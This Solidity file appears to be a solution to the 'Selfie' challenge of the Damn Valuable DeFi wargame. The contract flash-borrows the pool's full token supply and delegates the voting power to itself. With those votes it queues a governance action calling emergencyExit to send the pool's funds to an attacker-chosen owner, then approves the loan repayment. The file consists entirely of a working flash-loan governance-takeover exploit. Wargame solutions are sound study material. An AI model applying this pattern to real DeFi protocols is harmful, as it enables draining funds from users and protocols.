import "../selfie/SelfiePool.sol";
import "../DamnValuableVotes.sol";

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieExploit is IERC3156FlashBorrower {
    SelfiePool pool;
    DamnValuableVotes public damnValuableToken;
    address owner;

    constructor(address poolAddress, address damnValuableTokenAddr, address _owner) {
        pool = SelfiePool(poolAddress);
        damnValuableToken = DamnValuableVotes(damnValuableTokenAddr);
        owner = _owner;
    }

    function attack() public {
        uint256 amountToBorrow = pool.maxFlashLoan(address(damnValuableToken));
        pool.flashLoan(IERC3156FlashBorrower(this), address(damnValuableToken), amountToBorrow, "");
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {
        damnValuableToken.delegate(address(this));
        pool.governance().queueAction(address(pool), 0, abi.encodeWithSignature("emergencyExit(address)", owner));
        damnValuableToken.approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
